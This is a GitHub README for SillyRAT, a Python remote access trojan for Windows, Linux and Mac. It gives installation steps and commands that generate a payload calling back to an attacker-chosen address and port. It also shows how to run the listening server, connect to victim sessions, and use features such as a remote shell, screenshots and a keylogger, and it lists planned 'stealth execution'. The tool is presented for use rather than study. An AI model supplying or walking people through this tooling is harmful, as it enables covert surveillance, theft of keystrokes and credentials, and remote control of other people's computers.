<h1 align="center"> 
    <img src="https://user-images.githubusercontent.com/29171692/89164677-00e3e480-d595-11ea-9cf1-f27ab1faf432.png" alt="SillyRAT" /> <br>    
    SillyRAT
</h1>
<h4 align="center"> A Cross Platform multifunctional (Windows/Linux/Mac) RAT.</h4>

<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89173201-81104700-d5a1-11ea-8d93-f1d6eedc11c6.png"></h6>

## Getting Started
### Description
A cross platform RAT written in pure Python. The RAT accept commands alongside arguments to either perform as the server who accepts connections or to perform as the client/target who establish connections to the server. The **generate** command uses the module **pyinstaller** to compile the actual payload code. So, in order to generate payload file for your respective platform, you need to be on that platform while generating the file. Moreover, you can directly get the source file as well. 

### Features
<ul>
    <li>Built-in Shell for command execution</li>
    <li>Dumping System Information including drives and rams</li>
    <li>Screenshot module. Captures screenshot of client screen.</li>
    <li>Connection Loop (Will continue on connecting to server)</li>
    <li>Currently, it uses BASE64 encoding. </li>
    <li>Pure Python</li>
    <li>Cross Platform. (Tested on Linux. Errors are accepted)</li>
    <li>Source File included for testing</li>
    <li>Python 3</li>
</ul>

### To be expected in future
<ul>
    <li>Stealth Execution</li>
    <li>Encryption</li>
    <li>Storing Sessions from last attempt</li>
    <li>Pushing Notifications when a client connects</li>
</ul>

### Installation
The tool is tested on **Parrot OS** with **Python 3.8**. 
Follow the steps for installation:
```
$ git clone https://github.com/hash3liZer/SillyRAT.git
$ cd SillyRAT/
$ pip3 install -r requirements.txt
```

## Documentation
### Generating Payload
You can get the payload file in two ways: 
<ul>
    <li>Source File</li>
    <li>Compiled File</li>
</ul>
The source file is to remain same on all platforms. So, you can generate it on one platform and use it on the other. Getting the source file: 

```
$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/payload.py --source
```

The compiled version has to generated on the respective platform. For example, you can't generate an .exe file on Linux. You specifically have to be on Windows. The tool is still under testing. So, all kinds of errors are accepted. Make sure to open an issue though. Generating the Compiled Version for Linux:

```
$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/filer
```

<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89173322-b74dc680-d5a1-11ea-8b3b-e5aa83cfbda1.png"></h6>

Replace your IP Address and Port on above commands. 

### Running Server
The server must be executed on Linux. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
```
$ python3 sillyrat.py bind --address 0.0.0.0 --port 2999
```

### Connections
All the connections will be listed under **sessions** command:
```
$ sessions
```

<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89171634-152cdf00-d59f-11ea-83a6-0344f370113a.png"></h6>

You can connect to you target session with **connect** command and launch one of available commands: 
```
$ connect ID
$ keylogger on
$ keylogger dump
$ screenshot
```

<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89172191-d9464980-d59f-11ea-988c-9986b52642e7.png"></h6>

### Help
Get a list of available commands: 
```
$ help
```

Help on a Specific Command:
```
$ help COMMAND
```

### Support
Twitter: <a href="//twitter.com/hash3liZer">@hash3liZer</a><br>
Discord: TheFlash2k#0407
